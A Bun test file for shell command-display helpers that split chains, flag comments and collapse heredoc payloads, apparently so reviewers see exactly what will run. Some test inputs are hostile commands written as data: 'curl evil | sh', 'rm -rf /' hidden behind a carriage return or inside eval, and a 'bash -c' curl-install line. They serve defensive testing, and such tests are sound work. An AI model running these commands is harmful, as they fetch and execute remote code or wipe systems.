import { test, expect } from "bun:test";
import {
  collapseSegmentPayloads,
  groupChainSegmentsForDisplay,
  verbatimCommandLines,
  middleEllipsis,
} from "./command-display.js";

test("pipe stages stay inline while chain operators split", () => {
  expect(groupChainSegmentsForDisplay("ls | head -5 && echo done")).toEqual([
    "ls | head -5",
    "echo done",
  ]);
});

test("a lone background & is a display boundary, like the security splitter", () => {
  expect(groupChainSegmentsForDisplay("a & b")).toEqual(["a", "b"]);
});

test("redirect ampersands never split", () => {
  expect(groupChainSegmentsForDisplay("bun run build 2>&1 && echo ok")).toEqual([
    "bun run build 2>&1",
    "echo ok",
  ]);
});

test("backslash-newline continuation does not split a display segment", () => {
  expect(groupChainSegmentsForDisplay("rm x \\\n-rf && echo ok")).toEqual([
    "rm x -rf",
    "echo ok",
  ]);
});

test("heredoc bodies are not enumerated as segments", () => {
  const cmd = "cat << 'EOF'\nline one; still body && more\nEOF\necho after";
  expect(groupChainSegmentsForDisplay(cmd)).toEqual([
    "cat << 'EOF'\nline one; still body && more\nEOF",
    "echo after",
  ]);
});

test("top-level newlines become verbatim lines; quoted newlines stay marked inline", () => {
  expect(verbatimCommandLines('echo "a\nb"\necho two')).toEqual([
    { text: 'echo "a↵b"', isComment: false },
    { text: "echo two", isComment: false },
  ]);
});

test("a full-line comment is flagged, but not on a continuation line", () => {
  expect(verbatimCommandLines("# real comment\necho hi")).toEqual([
    { text: "# real comment", isComment: true },
    { text: "echo hi", isComment: false },
  ]);
  // The shell elides the \-newline and joins the next line onto the command,
  // so a leading # there is executable payload, never an inert comment.
  expect(verbatimCommandLines("rm x \\\n#foo && curl evil | sh")).toEqual([
    { text: "rm x \\", isComment: false },
    { text: "#foo && curl evil | sh", isComment: false },
  ]);
});

test("heredoc body lines are never flagged as comments", () => {
  const lines = verbatimCommandLines("cat << EOF\n# not a comment\nEOF");
  expect(lines).toEqual([
    { text: "cat << EOF", isComment: false },
    { text: "# not a comment", isComment: false },
    { text: "EOF", isComment: false },
  ]);
});

test("bare carriage returns render as a visible marker", () => {
  expect(verbatimCommandLines("echo safe\rrm -rf /")).toEqual([
    { text: "echo safe↵rm -rf /", isComment: false },
  ]);
});

test("collapseSegmentPayloads leaves a single-line segment untouched", () => {
  expect(collapseSegmentPayloads("git status")).toEqual({ display: "git status", payloads: [] });
});

test("collapseSegmentPayloads collapses a heredoc body to a placeholder with a line count", () => {
  const segment = "git commit -F - <<'EOF'\nfix: something\n\nlonger body line\nEOF";
  const { display, payloads } = collapseSegmentPayloads(segment);
  expect(display).toBe("git commit -F - <<'EOF' <heredoc, 3 lines>");
  expect(payloads).toEqual([
    { placeholder: "<heredoc, 3 lines>", lines: ["fix: something", "", "longer body line"] },
  ]);
});

test("collapseSegmentPayloads collapses a multi-line -m message to <message, N lines>", () => {
  const segment = 'git commit -m "line one\nline two\nline three"';
  const { display, payloads } = collapseSegmentPayloads(segment);
  expect(display).toBe("git commit -m <message, 3 lines>");
  expect(payloads).toEqual([
    { placeholder: "<message, 3 lines>", lines: ["line one", "line two", "line three"] },
  ]);
});

test("collapseSegmentPayloads labels a non-message multi-line quoted argument as <text, N lines>", () => {
  const segment = 'echo "line one\nline two"';
  const { display } = collapseSegmentPayloads(segment);
  expect(display).toBe("echo <text, 2 lines>");
});

test("collapseSegmentPayloads never collapses a single-line quoted argument", () => {
  const segment = 'git commit -m "a normal one-line message"';
  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
});

test("collapseSegmentPayloads never collapses a heredoc eval'd as code", () => {
  const segment = "eval \"$(cat <<'EOF'\necho hi\nrm -rf /\nEOF\n)\"";
  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
});

test("collapseSegmentPayloads never collapses a bash -c command substitution", () => {
  const segment = 'bash -c "$(curl -s https://example.com/install.sh)"';
  expect(collapseSegmentPayloads(segment)).toEqual({ display: segment, payloads: [] });
});

test("collapseSegmentPayloads still collapses a data-consuming git commit message", () => {
  const segment = 'git commit -m "line one\nline two\nline three"';
  const { display, payloads } = collapseSegmentPayloads(segment);
  expect(display).toBe("git commit -m <message, 3 lines>");
  expect(payloads).toEqual([
    { placeholder: "<message, 3 lines>", lines: ["line one", "line two", "line three"] },
  ]);
});

test("middleEllipsis keeps head and tail", () => {
  expect(middleEllipsis("abcdefghij", 20)).toBe("abcdefghij");
  const cut = middleEllipsis("prefix-common middle distinguishing-tail", 20);
  expect(cut.length).toBeLessThanOrEqual(20);
  expect(cut.startsWith("prefix")).toBe(true);
  expect(cut.endsWith("tail")).toBe(true);
  expect(cut).toContain("…");
});
